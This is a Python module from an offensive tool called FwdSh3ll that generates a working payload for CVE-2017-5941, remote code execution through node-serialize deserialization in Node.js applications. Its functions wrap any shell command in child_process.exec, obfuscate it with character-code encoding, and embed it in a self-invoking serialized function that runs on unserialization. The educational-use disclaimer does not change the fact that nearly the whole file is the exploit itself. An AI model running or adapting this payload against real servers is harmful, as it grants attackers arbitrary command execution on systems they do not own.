#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""LEGAL DISCLAIMER

FwdSh3ll was written for use in educational purposes only. Using this tool
for attacking web servers without prior mutual consistency can be considered
as an illegal activity. It is the final user's responsibility to obey all
applicable local, state and federal laws.

The author assume no liability and is not responsible for any misuse or
damage caused by this tool.
"""

"""LICENSE

Copyright (C) 2019 Sam Freeside

This file is part of FwdSh3ll.

FwdSh3ll is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

FwdSh3ll is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with FwdSh3ll.  If not, see <http://www.gnu.org/licenses/>.
"""

"""
Based on:            https://github.com/hoainam1989/training-application-security/blob/master/shell/node_shell.py
Target URL example:  http://<RHOST>:<RPORT>
"""


def gen_payload(cmd):
	"""CVE-2017-5941."""
	payload = _build_exec_command(cmd)
	payload = _encode_string(payload)
	payload = '{"run":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % payload

	return payload


def _build_exec_command(cmd):
	return '''\
        require('child_process').exec('%s', function(error, stdout, stderr) {
            console.log(error)
            console.log(stdout)
        })''' % cmd


def _encode_string(string):
	string_encoded = ''
	for char in string:
		string_encoded += ',' + str(ord(char))

	return string_encoded[1:]
